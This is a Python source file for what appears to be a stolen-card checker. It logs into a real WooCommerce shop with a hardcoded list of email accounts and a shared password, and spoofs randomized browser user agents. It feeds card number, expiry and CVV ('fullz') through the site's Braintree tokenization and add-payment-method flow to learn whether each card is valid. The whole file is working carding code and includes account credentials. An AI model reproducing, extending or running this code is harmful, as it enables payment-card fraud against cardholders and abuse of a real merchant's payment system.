import base64
import json
import random
import re
import string
import time
import uuid
from FUNC.defs import *
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote, urlparse, parse_qs

# Utility function
def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

# Generate unique session code
def generar_codigo_session():
    return str(uuid.uuid4())

# Main async function for creating Braintree auth
async def create_braintree_auth(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        url = "unpluggedperformance.com"
        acc = [
            'electraxsk@gmail.com',
            'spyxspidey@gmail.com',
            'opmaddy44@gmail.com',
            'pivigo5258@ronete.com',
            'cewofad422@ronete.com',
            'dipata3041@mowline.com',
            'ogmoik@telegmail.com',
            'domab77281@nongnue.com'
        ]
        email = random.choice(acc)
        print(email)
        SessionId = generar_codigo_session()
        correo = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        user = f"Mozilla/5.0 (Windows NT {random.randint(11, 99)}.0; Win64; x64) AppleWebKit/{random.randint(111, 999)}.{random.randint(11, 99)} (KHTML, like Gecko) Chrome/{random.randint(11, 99)}.0.{random.randint(1111, 9999)}.{random.randint(111, 999)} Safari/{random.randint(111, 999)}.{random.randint(11, 99)}"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': user,
        }

        # Fetch initial page
        response = await session.get(f'https://{url}/my-account/', headers=headers)
        rnonce = gets(response.text, '"woocommerce-login-nonce" value="', '"')
        print(rnonce)

        time.sleep(1)

        # Login request
        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'referer': f'https://{url}/my-account/',
        })

        data = {
            'username': email,
            'password': '#Hackme12',
            'woocommerce-login-nonce': rnonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

        response = await session.post(f'https://{url}/my-account/', headers=headers, data=data)

        # Add payment method page
        headers.update({
            'referer': f'https://{url}/my-account/payment-methods/',
        })

        r6 = await session.get(f"https://{url}/my-account/add-payment-method/", headers=headers)

        wnonce = gets(r6.text, '"woocommerce-add-payment-method-nonce" value="', '"')
        print(wnonce)

        clienttoken = gets(r6.text, 'var wc_braintree_client_token = ["', '"')
        bearer = json.loads(base64.b64decode(clienttoken))
        bearer = bearer['authorizationFingerprint']

        time.sleep(1)

        head8 = {
            "Host": "payments.braintree-api.com",
            "content-type": "application/json",
            "authorization": f"Bearer {bearer}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "braintree-version": "2018-05-10",
            "accept": "*/*",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
        }

        post8 = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "client",
                "sessionId": SessionId,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        "number": f"{cc}",
                        "expirationMonth": f"{mes}",
                        "expirationYear": f"{ano}",
                        "cvv": f"{cvv}",
                        "billingAddress": {
                            'postalCode': '10080',
                            'streetAddress': '',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                }
            },
            "operationName": "TokenizeCreditCard",
        }

        r8 = await session.post(
            "https://payments.braintree-api.com/graphql",
            headers=head8,
            json=post8,
        )
        tok = gets(r8.text, '"token":"', '"')
        brand_ = gets(r8.text, '"brandCode":"', '"').lower()
        print(brand_)

        time.sleep(1)

        # Final add payment method
        head9 = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://unpluggedperformance.com',
            'referer': 'https://unpluggedperformance.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': user,
        }

        post9 = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': tok,
            'braintree_cc_device_data': '{"device_session_id":"7838ef58714c30a4cc62234ea5301400","fraud_merchant_id":null,"correlation_id":"3423ce6e-7828-44ee-9ad8-76dc5f24"}',
            'braintree_cc_3ds_nonce_key': '',
            'woocommerce-add-payment-method-nonce': wnonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1'
        }

        response = await session.post(
            f"https://{url}/my-account/add-payment-method/",
            headers=head9,
            data=post9,
        )

        code = gets(response.text, 'class="wc-block-components-notice-banner__content">', '</div>')
        auth = gets(response.text, '<div class="woocommerce-message" role="alert">', '</div>')

        result = "No match found"  # Default value
        match = re.search(code, response.text)
        if match:
            result = match.group(0)
        print(result)

        time.sleep(2)

        return result

    except Exception as e:
        print(f"Error: {e}")
        return str(e)
